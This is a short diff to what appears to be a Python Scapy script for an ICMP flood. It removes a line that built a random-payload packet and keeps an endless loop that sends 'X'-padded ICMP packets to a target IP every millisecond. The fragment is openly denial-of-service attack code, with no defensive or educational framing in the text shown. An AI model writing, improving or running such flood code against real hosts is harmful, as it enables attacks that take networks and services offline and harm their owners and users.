@@ -10,8 +10,6 @@ delay = 0.001  # Time between packets
 
 print(f"[+] Sending ICMP flood to {target_ip}...")
 
-packet = IP(dst=target_ip)/ICMP()/os.urandom(packet_size)
-
 try:
     while True:
         pkt = IP(dst=target_ip)/ICMP()/("X" * packet_size)
